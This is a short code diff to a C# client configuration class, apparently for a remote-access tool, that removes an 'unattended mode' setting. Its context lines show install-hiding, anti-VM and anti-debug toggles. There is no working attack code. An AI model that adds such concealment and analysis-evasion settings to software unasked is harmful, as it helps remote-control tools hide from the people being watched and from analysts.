@@ -38,7 +38,6 @@ namespace Pulsar.Client.Config
         public static bool HIDEINSTALLSUBDIRECTORY = false;
         public static string INSTALLPATH = "";
         public static string LOGSPATH = "";
-        public static bool UNATTENDEDMODE = true;
         public static bool ANTIVM = false;
         public static bool ANTIDEBUG = false;
         public static bool PASTEBIN = false;
@@ -77,7 +76,6 @@ namespace Pulsar.Client.Config
         public static bool HIDEINSTALLSUBDIRECTORY = false;
         public static string INSTALLPATH = "";
         public static string LOGSPATH = "";
-        public static bool UNATTENDEDMODE = true;
         public static bool ANTIVM = false;
         public static bool ANTIDEBUG = false;
         public static bool PASTEBIN = false;
